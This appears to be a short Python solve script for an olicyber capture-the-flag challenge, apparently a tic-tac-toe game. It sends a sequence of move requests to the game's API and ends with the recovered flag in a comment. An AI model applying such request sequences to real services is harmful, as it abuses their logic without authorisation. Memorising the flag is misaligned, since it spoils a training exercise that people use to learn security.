import requests

site = "http://trais.challs.olicyber.it/"

s = requests.session()

mv0 = s.get(site)
mv1 = s.get(f"{site}/api/move/2/2").text
mv2 = s.get(f"{site}/api/move/2/1").text
mv3 = s.get(f"{site}/api/move/2/3").text
print(mv3)

#flag{w4ai7...n0n_val3_e'_c0n7r0_l3_regol3}
